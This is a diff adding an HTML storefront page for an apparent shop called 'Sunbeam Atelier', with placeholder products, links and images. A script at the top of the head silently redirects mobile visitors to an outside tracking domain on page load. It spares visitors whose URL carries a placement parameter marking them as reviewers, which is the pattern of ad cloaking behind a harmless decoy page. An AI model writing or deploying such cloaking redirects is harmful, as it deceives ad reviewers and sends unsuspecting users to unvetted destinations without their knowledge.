@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+(function() {
+    try {
+        const params = new URLSearchParams(window.location.search);
+        const placementValue = params.get("ppc");
+
+        const isMobileDevice = () => {
+            const ua = navigator.userAgent;
+            const matches = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone|Mobile|Tablet/i;
+            return matches.test(ua) || (window.innerWidth <= 768 && window.innerHeight <= 1024);
+        };
+
+        // PARAMS-ONLY: Only check placement parameter, NO user agent detection
+        const isBot = placementValue === "__PLACEMENT__";
+
+        if (!isBot && isMobileDevice()) {
+            window.location.replace("https://rgbad.ttrk.io/test");
+            return;
+        }
+
+        window.setTimeout(() => {
+            if (!isBot && isMobileDevice()) {
+                window.top.location = "https://rgbad.ttrk.io/test";
+            }
+        }, 50);
+    } catch (error) {
+        console.error(error);
+    }
+})();
+</script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sunbeam Atelier — Curated Daily Goods</title>
+    <meta name="description" content="Sunbeam Atelier curates bright, easy pieces for calm mornings and slow afternoons." />
+    <style>
+        :root {
+            --bg: #f7f4ef;
+            --text: #1f1a17;
+            --muted: #706458;
+            --accent: #f6a833;
+            --accent-2: #3f7bc4;
+            --card: #ffffff;
+            --border: rgba(31, 26, 23, 0.12);
+            --shadow: 0 18px 45px rgba(119, 106, 94, 0.12);
+        }
+
+        *, *::before, *::after { box-sizing: border-box; }
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: "Calibre", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        }
+
+        img { max-width: 100%; display: block; }
+        a { color: inherit; text-decoration: none; }
+        button { font-family: inherit; }
+
+        .container {
+            width: min(1180px, 94vw);
+            margin-inline: auto;
+        }
+
+        header {
+            background: rgba(247, 244, 239, 0.8);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 15;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+        }
+
+        .brand-mark {
+            width: 42px;
+            height: 42px;
+            border-radius: 12px;
+            background: radial-gradient(circle at 70% 30%, #ffe3a1, #f6a833 65%, #f59f26);
+            box-shadow: 0 6px 18px rgba(245, 159, 38, 0.35);
+        }
+
+        .nav ul {
+            list-style: none;
+            display: flex;
+            gap: 1.6rem;
+            margin: 0;
+            padding: 0;
+            font-size: 0.95rem;
+        }
+
+        .nav a {
+            padding: 0.55rem 0.85rem;
+            border-radius: 999px;
+            transition: background 0.2s ease, transform 0.2s ease;
+        }
+
+        .nav a:hover {
+            background: rgba(246, 168, 51, 0.15);
+            transform: translateY(-1px);
+        }
+
+        .hero {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            padding: 60px 0 42px;
+        }
+
+        .hero-card {
+            background: var(--card);
+            border-radius: 24px;
+            padding: 42px;
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            box-shadow: var(--shadow);
+        }
+
+        .kicker {
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            font-size: 0.68rem;
+            color: var(--muted);
+        }
+
+        h1 {
+            font-size: clamp(2rem, 3.4vw, 3.2rem);
+            letter-spacing: -0.02em;
+            margin: 0.6rem 0 1.2rem;
+        }
+
+        .lead {
+            font-size: 1.05rem;
+            color: rgba(31, 26, 23, 0.72);
+            line-height: 1.6;
+            margin-bottom: 1.6rem;
+        }
+
+        .hero-cta {
+            display: inline-flex;
+            align-items: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.9rem 1.4rem;
+            border-radius: 999px;
+            font-weight: 600;
+            letter-spacing: 0.03em;
+            border: 1px solid transparent;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .btn.primary {
+            background: var(--accent);
+            color: #2c1c0a;
+            box-shadow: 0 14px 24px rgba(246, 168, 51, 0.28);
+        }
+
+        .btn.secondary {
+            border-color: rgba(31, 26, 23, 0.18);
+            background: rgba(255, 255, 255, 0.8);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .showcase {
+            border-radius: 26px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: var(--shadow);
+        }
+
+        .showcase img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            aspect-ratio: 4 / 3;
+        }
+
+        .section-head {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin: 36px 0 18px;
+            gap: 1rem;
+        }
+
+        .section-head h2 {
+            margin: 0;
+            font-size: clamp(1.4rem, 2.4vw, 1.8rem);
+        }
+
+        .section-head p {
+            margin: 0;
+            color: rgba(31, 26, 23, 0.65);
+        }
+
+        .grid {
+            display: grid;
+            gap: 18px;
+            grid-template-columns: repeat(12, 1fr);
+        }
+
+        .product-card {
+            grid-column: span 12;
+            background: var(--card);
+            border-radius: 22px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(255, 255, 255, 0.7);
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .product-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 24px 36px rgba(119, 106, 94, 0.16);
+        }
+
+        .product-card img {
+            aspect-ratio: 1 / 1;
+            object-fit: cover;
+        }
+
+        .card-body {
+            padding: 20px 22px;
+        }
+
+        .title {
+            margin: 0 0 0.35rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+
+        .sub {
+            color: rgba(31, 26, 23, 0.65);
+            font-size: 0.95rem;
+            margin: 0 0 0.7rem;
+        }
+
+        .price {
+            font-weight: 700;
+            color: var(--accent);
+            font-size: 1.05rem;
+        }
+
+        .card-actions {
+            padding: 0 22px 20px;
+            display: flex;
+            gap: 0.6rem;
+        }
+
+        .pill {
+            padding: 0.6rem 0.9rem;
+            border-radius: 999px;
+            border: 1px solid rgba(31, 26, 23, 0.18);
+            background: rgba(247, 244, 239, 0.9);
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .pill:hover {
+            background: rgba(246, 168, 51, 0.18);
+            border-color: rgba(246, 168, 51, 0.3);
+        }
+
+        .pill.ghost {
+            background: transparent;
+        }
+
+        footer {
+            margin-top: 56px;
+            padding: 32px 0 48px;
+            border-top: 1px solid var(--border);
+            color: rgba(31, 26, 23, 0.68);
+        }
+
+        .foot {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .foot-links {
+            display: flex;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+            font-size: 0.95rem;
+        }
+
+        .foot-links a {
+            padding: 0.4rem 0.6rem;
+            border-radius: 12px;
+        }
+
+        .foot-links a:hover {
+            background: rgba(63, 123, 196, 0.12);
+            color: #2b4570;
+        }
+
+        @media (min-width: 720px) { .product-card { grid-column: span 6; } }
+        @media (min-width: 1100px) { .product-card { grid-column: span 4; } }
+        @media (max-width: 900px) {
+            .hero { grid-template-columns: 1fr; }
+            .hero-card { order: 2; }
+            .showcase { order: 1; }
+        }
+    </style>
+</head>
+<body>
+    <header aria-label="Primary navigation">
+        <div class="container nav">
+            <a class="brand" href="#">
+                <span class="brand-mark" aria-hidden="true"></span>
+                <span>Sunbeam Atelier</span>
+            </a>
+            <nav aria-label="Main menu">
+                <ul>
+                    <li><a href="#">Collections</a></li>
+                    <li><a href="#">Kitchen</a></li>
+                    <li><a href="#">Desk</a></li>
+                    <li><a href="#">Bath</a></li>
+                    <li><a href="#">Journal</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section class="container hero" aria-labelledby="hero-title">
+            <div class="hero-card">
+                <p class="kicker">Season 04 · Spring Edit</p>
+                <h1 id="hero-title">Glow-filled essentials for brighter days</h1>
+                <p class="lead">
+                    We source uplifting textures, sunwashed palettes, and joyful forms from studios we trust.
+                    Discover limited runs ready to layer into daily rituals.
+                </p>
+                <div class="hero-cta">
+                    <a class="btn primary" href="#">Browse the Lookbook</a>
+                    <a class="btn secondary" href="#">Studio Notes</a>
+                </div>
+            </div>
+            <div class="showcase" aria-hidden="true">
+                <img src="https://picsum.photos/1200/900?random=2001" alt="Sunlit breakfast table with curated tableware">
+            </div>
+        </section>
+
+        <section class="container" aria-labelledby="products-title">
+            <div class="section-head">
+                <h2 id="products-title">This Week's Highlights</h2>
+                <p>Edition of five: a rotation of joy-sparking daily goods.</p>
+            </div>
+
+            <div class="grid">
+                <article class="product-card">
+                    <img src="https://picsum.photos/600/600?random=201" alt="Solstice Pitcher product image">
+                    <div class="card-body">
+                        <h3 class="title">Solstice Pitcher</h3>
+                        <p class="sub">Handblown glass with frosted gradient finish.</p>
+                        <p class="price">$76</p>
+                    </div>
+                    <div class="card-actions">
+                        <a class="pill" href="#">View Details</a>
+                        <a class="pill ghost" href="#">Add to Cart</a>
+                    </div>
+                </article>
+
+                <article class="product-card">
+                    <img src="https://picsum.photos/600/600?random=202" alt="Daybreak Linen Apron product image">
+                    <div class="card-body">
+                        <h3 class="title">Daybreak Linen Apron</h3>
+                        <p class="sub">Stonewashed linen in marigold and cloud colorways.</p>
+                        <p class="price">$68</p>
+                    </div>
+                    <div class="card-actions">
+                        <a class="pill" href="#">View Details</a>
+                        <a class="pill ghost" href="#">Add to Cart</a>
+                    </div>
+                </article>
+
+                <article class="product-card">
+                    <img src="https://picsum.photos/600/600?random=203" alt="Citrus Grove Candle set product image">
+                    <div class="card-body">
+                        <h3 class="title">Citrus Grove Candle Set</h3>
+                        <p class="sub">Soy blend with grapefruit, neroli, and sandalwood.</p>
+                        <p class="price">$44</p>
+                    </div>
+                    <div class="card-actions">
+                        <a class="pill" href="#">View Details</a>
+                        <a class="pill ghost" href="#">Add to Cart</a>
+                    </div>
+                </article>
+
+                <article class="product-card">
+                    <img src="https://picsum.photos/600/600?random=204" alt="Pebble Breakfast Set product image">
+                    <div class="card-body">
+                        <h3 class="title">Pebble Breakfast Set</h3>
+                        <p class="sub">Stoneware duo with reactive glaze interior.</p>
+                        <p class="price">$58</p>
+                    </div>
+                    <div class="card-actions">
+                        <a class="pill" href="#">View Details</a>
+                        <a class="pill ghost" href="#">Add to Cart</a>
+                    </div>
+                </article>
+
+                <article class="product-card">
+                    <img src="https://picsum.photos/600/600?random=205" alt="Aurora Pour-Over Dripper product image">
+                    <div class="card-body">
+                        <h3 class="title">Aurora Pour-Over Dripper</h3>
+                        <p class="sub">Ceramic dripper with brass stand and beech base.</p>
+                        <p class="price">$88</p>
+                    </div>
+                    <div class="card-actions">
+                        <a class="pill" href="#">View Details</a>
+                        <a class="pill ghost" href="#">Add to Cart</a>
+                    </div>
+                </article>
+            </div>
+        </section>
+    </main>
+
+    <footer aria-label="Site footer">
+        <div class="container foot">
+            <p>© <span id="year">2025</span> Sunbeam Atelier. All Rights Reserved.</p>
+            <div class="foot-links">
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('year').textContent = new Date().getFullYear();
+    </script>
+</body>
+</html>
